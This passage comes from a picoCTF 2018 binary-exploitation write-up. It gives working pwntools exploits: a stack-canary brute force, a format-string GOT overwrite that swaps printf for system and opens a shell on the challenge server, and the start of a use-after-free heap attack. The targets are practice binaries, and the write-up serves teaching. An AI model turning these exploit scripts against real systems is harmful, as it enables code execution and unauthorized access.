        canary<span style="color:#ff79c6">=</span>brute_Force_next_canary_char(i, canary, initial_payload)
    <span style="color:#ff79c6">return</span> canary

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_offset</span>():
    offset <span style="color:#ff79c6">=</span> cyclic_find(<span style="color:#f1fa8c">&#39;eaaa&#39;</span>)
    <span style="color:#ff79c6">return</span> offset

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">payload</span>():
    initial_payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;A&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">32</span>
    canary<span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
    canary <span style="color:#ff79c6">=</span> guess_canary(initial_payload, canary)
    e <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;./vuln&#39;</span>)
    <span style="color:#6272a4">#win = hex(e.symbols[&#39;win&#39;])</span>
    <span style="color:#6272a4">#ret_addr =  p32(0x080486eb)</span>
    payload <span style="color:#ff79c6">=</span> initial_payload <span style="color:#ff79c6">+</span> canary <span style="color:#ff79c6">+</span> cyclic(get_offset()) <span style="color:#ff79c6">+</span> p32(e<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;win&#39;</span>])
    <span style="color:#8be9fd;font-style:italic">print</span> payload
    <span style="color:#ff79c6">return</span> payload

<span style="color:#8be9fd;font-style:italic">print</span> execute(<span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#bd93f9">300</span>) , payload())
</code></pre></td></tr></table>
</div>
</div><h2 id="echo-back">echo-back</h2>
<ul>
<li>source: <a href="./resources/echo-back/echoback.c">echoback.c</a></li>
<li>binary: <a href="./resources/echo-back/echoback">echoback</a></li>
</ul>
<p>The program prompt for our input which is printed back to us. However there is an obvious format-string vulnerability.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/types.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6"></span>
<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">vuln</span>(){
    <span style="color:#8be9fd">char</span> input[<span style="color:#bd93f9">128</span>] <span style="color:#ff79c6">=</span> {};

    system(<span style="color:#f1fa8c">&#34;echo input your message:&#34;</span>);
    read(<span style="color:#bd93f9">0</span>,input,<span style="color:#bd93f9">127</span>);

    printf(input);	<span style="color:#6272a4">/* format-string vulnerability */</span>
    puts(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);

    puts(<span style="color:#f1fa8c">&#34;Thanks for sending the message!&#34;</span>);
}
</code></pre></td></tr></table>
</div>
</div><p>Running checksec shows that GOT and PLT are writeable</p>
<p>We can leverage the format string to overwrite the puts and printf in Global Offset Table (GOT):</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">checksec ./echoback
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#39;/home/ctf/ctf_writeups/picoCTF2018/binary-exploitation/resources/echo-back/echoback&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO		&lt;-- GOT and PLT are writeable
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span style="color:#ff79c6">(</span>0x8048000<span style="color:#ff79c6">)</span>
~~

The exploit is as simple as:
1. Overwrite puts with vuln
2. Overwrite <span style="color:#8be9fd;font-style:italic">printf</span> with system
The result is described below:
~~~c
void vuln<span style="color:#ff79c6">(){</span>
    char input<span style="color:#ff79c6">[</span>128<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">{}</span>;

    system<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;echo input your message:&#34;</span><span style="color:#ff79c6">)</span>;
    read<span style="color:#ff79c6">(</span>0,input,127<span style="color:#ff79c6">)</span>;

    system<span style="color:#ff79c6">(</span>input<span style="color:#ff79c6">)</span>;	/* printf<span style="color:#ff79c6">(</span>input<span style="color:#ff79c6">)</span>;*/
    vuln<span style="color:#ff79c6">()</span>;		/* puts<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;\n&#34;</span><span style="color:#ff79c6">)</span>; 	 */

    vuln<span style="color:#ff79c6">()</span>;		/* puts<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Thanks for sending the message!&#34;</span><span style="color:#ff79c6">)</span>; */
<span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><ol>
<li>After the format string exploitation, instead of executing <code>puts(&quot;\n&quot;)</code>, vuln() will be recursively called and the user will be prompted again to input a message.</li>
<li>Except, that this time, the user input would be passed to the system function instead of printf.</li>
<li>The user can simply manually pass any command as input, such as <code>ls</code> or <code>cat flag.txt</code> or <code>/bin/sh</code> to obtain a shell</li>
</ol>
<p>Full exploit:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>

<span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>

DEV <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
h, p <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;2018shell.picoctf.com&#39;</span>, <span style="color:#bd93f9">22462</span>

PREFIX <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;/bin/sh#&#39;</span>	<span style="color:#6272a4"># The hash sign is needed to comment-out and ignore the rest of the format-string payload</span>
PREFIX <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>

e <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;./echoback&#39;</span>)

log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;Address of puts() .got.plt: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(<span style="color:#8be9fd;font-style:italic">hex</span>(e<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;puts&#39;</span>])))
log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;Address of printf() .got.plt: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(<span style="color:#8be9fd;font-style:italic">hex</span>( e<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;printf&#39;</span>])))
log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;Address of vuln(): </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(<span style="color:#8be9fd;font-style:italic">hex</span>(e<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;vuln&#39;</span>])))
log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;Address of system() .plt: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(<span style="color:#8be9fd;font-style:italic">hex</span>(e<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;system&#39;</span>])))

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_process</span>():
    <span style="color:#ff79c6">if</span> DEV:
        s <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#39;./echoback&#39;</span>)
    <span style="color:#ff79c6">else</span>:
        s <span style="color:#ff79c6">=</span> remote(h, p)
    <span style="color:#ff79c6">return</span> s

<span style="color:#6272a4"># Function called in order to send the fmt string payload</span>
<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">send_payload</span>(proc, payload):
    <span style="color:#8be9fd;font-style:italic">print</span>(enhex(PREFIX<span style="color:#ff79c6">+</span>payload))
    proc<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;message:&#39;</span>,PREFIX<span style="color:#ff79c6">+</span>payload)  <span style="color:#6272a4">#PREFIX needs to be here, otherwise it affects autofmt.offset</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">payload</span>():
    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">execute_fmt</span>(payload):
        proc <span style="color:#ff79c6">=</span> get_process()
        send_payload(proc, payload)
        <span style="color:#ff79c6">return</span> proc<span style="color:#ff79c6">.</span>recvall()

    <span style="color:#6272a4">#Automatically get the offset of the Formatted String Attack</span>
    autofmt <span style="color:#ff79c6">=</span> FmtStr(execute_fmt)
    log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#39;offset&#39;</span>, autofmt<span style="color:#ff79c6">.</span>offset)

    writes <span style="color:#ff79c6">=</span> {e<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;puts&#39;</span>]:   e<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;vuln&#39;</span>],
          e<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;printf&#39;</span>]: e<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;system&#39;</span>]}

    payload <span style="color:#ff79c6">=</span> fmtstr_payload(autofmt<span style="color:#ff79c6">.</span>offset, writes, numbwritten<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">len</span>(PREFIX))
    log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;Payload: </span><span style="color:#f1fa8c">{}{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(PREFIX, enhex(payload)))
    <span style="color:#ff79c6">return</span> payload

<span style="color:#6272a4">#send payload</span>
s <span style="color:#ff79c6">=</span> get_process()
send_payload(s, payload())
s<span style="color:#ff79c6">.</span>interactive()
</code></pre></td></tr></table>
</div>
</div><p>Alternatively, because payload() actually executes the format-string, it is possible to prefix the payload with a PREFIX='/bin/sh#'. The hash sign is needed to comment-out and ignore the rest of the format-string payload.</p>
<h2 id="are-you-root">are-you-root</h2>
<ul>
<li>source: <a href="./resources/are-you-root/auth.c">auth.c</a></li>
<li>binary: <a href="./resources/are-you-root/auth">auth</a></li>
</ul>
<p>This is an example of use-after-free Attack (Heap exploitation).</p>
<p>Note that this attack may not be possible as-is on a modern heap implementation. Success to run the exploit depends on which heap implementation the target operating system is using.
Therefore, exploit code adjustments along with thorough understanding of the heap implementation are needed to have this technique works.</p>
<p>This 64bits binary has a Canary enabled, and no buffer overflow is possible</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">checksec auth
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#39;/home/ctf/kali/picoCTF/binary-exploitation/are-you-root/auth&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found	&lt;-- Canary is enabled
    NX:       NX enabled
    PIE:      No PIE <span style="color:#ff79c6">(</span>0x400000<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p>However, there is a heap overflow vulnerability on the user struct which can be exploited with a &lsquo;use-after-free&rsquo; attack</p>
<p>Indeed, the login command enable us to write the user-&gt;name on the heap</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">struct</span> user {
  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>name;
  auth_level_t level;
};
[...]
user <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">struct</span> user <span style="color:#ff79c6">*</span>)malloc(<span style="color:#ff79c6">sizeof</span>(<span style="color:#ff79c6">struct</span> user));
user<span style="color:#ff79c6">-&gt;</span>name <span style="color:#ff79c6">=</span> strdup(arg);
</code></pre></td></tr></table>
</div>
</div><p>The reset command will free(user-&gt;name), However it is not using calloc to zero out the memory&hellip; So the data will remain</p>
<p>A subsequent login command may reallocate the exact same memory space, with the same data if not overwritten</p>
<ol>
<li>login with a name having a size of 128 bits: first 64bits filled with &lsquo;a&rsquo;, second 64bits filled with \x05</li>
<li>reset to free the 128bits memory</li>
<li>login with a smaller name of size below 64bits results in a smaller memory allocation of 64bits at the previous location. The next 64 bits are not overwritten and occupy the place of user-&gt;level</li>
</ol>
<p>Therefore, the \x05 which was before part of user-&gt;name is now occupying the user-&gt;level location</p>
<pre tabindex="0"><code>    step 1: first login		step 2: reset			step 3: second login
&lt;---- name -----&gt;&lt;- level -&gt;	&lt;---- free -----&gt;		&lt; name &gt;&lt; level &gt;
+---------------+----------+	+---------------+----------+	+---------------+----------+
| 'a'*8 | \x05	| \x00	   |	| freed	| \x05  | \x00	   |	| 'A'   | \x05	| \x00	   |
+---------------+----------+	+---------------+----------+	+---------------+----------+
</code></pre><p>Full exploit:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>

DEV <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
